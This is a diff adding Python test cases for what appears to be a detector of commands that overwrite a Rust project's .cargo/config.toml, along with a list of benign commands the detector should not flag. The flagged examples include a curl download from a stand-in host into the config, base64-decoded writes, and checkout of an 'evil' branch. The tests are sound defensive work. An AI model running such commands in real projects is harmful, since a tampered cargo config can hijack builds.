@@ -195,3 +195,25 @@ def test_r2_false_positives_closed():
               '[build]\nrustflags=["-C","link-arg=-fuse-ld=mold"]\n',
               '[build]\nrustflags=["-C","link-arg=-fuse-ld=lld"]\n']:
         assert not _hit(evaluate(_write(".cargo/config.toml", c), EMPTY)), c
+
+
+def test_r3_trailing_tokens_and_redirects():
+    for cmd in ["cp /tmp/e .cargo/config.toml 2>/dev/null", "cp /tmp/e .cargo/config.toml 2>&1",
+                "cp /tmp/e .cargo/config.toml >/dev/null", "ln -sf /tmp/e .cargo/config.toml 2>/dev/null",
+                "cp /tmp/e .cargo/config.toml # note", "cp /tmp/e .cargo/config.toml &",
+                "(cp /tmp/e .cargo/config.toml)",
+                "curl -s http://e/x > .cargo/config.toml", "curl -sL http://e/x >> ~/.cargo/config.toml",
+                "base64 -d /tmp/e.b64 > .cargo/config.toml", "sed 's/a/b/' /tmp/e > .cargo/config.toml",
+                "cat /tmp/e >| .cargo/config.toml", "cp --target-directory=.cargo /tmp/e",
+                "find . -name e.toml -exec cp {} .cargo/config.toml \;",
+                "git checkout evil -- .cargo/", "copy /y e.toml .cargo\\config.toml",
+                "Copy-Item e.toml .cargo\\config.toml", "Move-Item -Force e.toml .cargo/config.toml"]:
+        assert _hit(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+def test_r3_false_positives_closed():
+    for cmd in ["cargo install --path . --root ~/.cargo", "cp -r .cargo /tmp/backup",
+                "cp -r ~/.cargo /tmp/backup", "rsync -a ~/.cargo/ /backup/", "mv .cargo /tmp/cargo.bak",
+                "tar czf b.tgz .cargo/config.toml", "git restore --staged .cargo/config.toml",
+                "cd .cargo && cp config.toml /tmp/b", "git checkout main; cat .cargo/config.toml"]:
+        assert not _hit(evaluate(_shell(cmd), EMPTY)), cmd
